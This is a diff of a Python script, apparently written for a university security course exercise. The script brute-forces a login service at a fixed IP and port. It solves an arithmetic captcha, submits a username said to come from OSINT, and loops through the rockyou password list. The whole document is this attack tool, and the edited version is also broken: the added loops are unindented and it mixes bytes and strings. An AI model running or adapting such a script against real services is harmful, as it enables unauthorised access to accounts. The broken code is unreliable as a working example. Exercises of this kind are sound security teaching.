@@ -30,7 +30,7 @@ import string
 import time
 host = "157.230.179.99" # IP address here
 port = 1337 # Port here
-wordlist = "C:/Users/Lesser Evan/Documents/Notes/Comp Sci Notes/CMSC389R Notes/389Rfall2019/week/2/rockyou.txt" # Point to wordlist file
+wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
 
 def brute_force(x):
     """
@@ -58,14 +58,14 @@ def brute_force(x):
     """
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host, port))
-    time.sleep(2)
-    data = s.recv(2048)     # Receives 1024 bytes from IP/Port
-    print(data)             # Prints data
-    data = data.decode("utf-8")    
-    print(data)
+    time.sleep(1)
+    data = s.recv(1024)     # Receives 1024 bytes from IP/Port
+    # data = data.decode("utf-8")    
+    while "=" not in data:
+    data += s.recv(1024)
+    data = data.decode("utf-8")
     captcha = re.search(r"(\d+) ([\*+\-\/]) (\d+) = \?$", data) 
-    print(captcha)
-    captch = "\n"
+    
     a = int(captcha.group(1))
     operand = captcha.group(2)
     b = int(captcha.group(3))
@@ -79,20 +79,29 @@ def brute_force(x):
     else:
         result = a-b
     captch = str(result)+"\n"
-    s.send(captch.encode())
-    data = s.recv(1024)     # Receives 1024 bytes from IP/Port 
+    s.send(str(result) + b'\n')
+    # s.send(captch.encode())
+    time.sleep(1)
+    data = s.recv(1024)     # Receives 1024 bytes from IP/Port
     username = "ejnorman84\n"   # Hint: use OSINT
-    s.send(username.encode())
-    data = s.recv(1024)
-    print(x)
-    s.send(x.encode())
+    s.send(username)
     time.sleep(1)
     data = s.recv(1024)
+    print(x)
+    s.send(str(x) + '\n')
+    data = s.recv(1024)
+    while len(data) < 4:
+    data += s.recv(1024)
     print(data)
     s.close()
 
 if __name__ == '__main__':
-    rockyou = open("rockyou.txt")
-    for line in rockyou:
-        brute_force(line)
+    rockyou = open(wordlist)
+    count = 567
+    whatever = rockyou.readlines()
+    for line in whatever[count:]:
+        brute_force(line.strip())
+    print(count)
+    count += 1
+        
     rockyou.close()
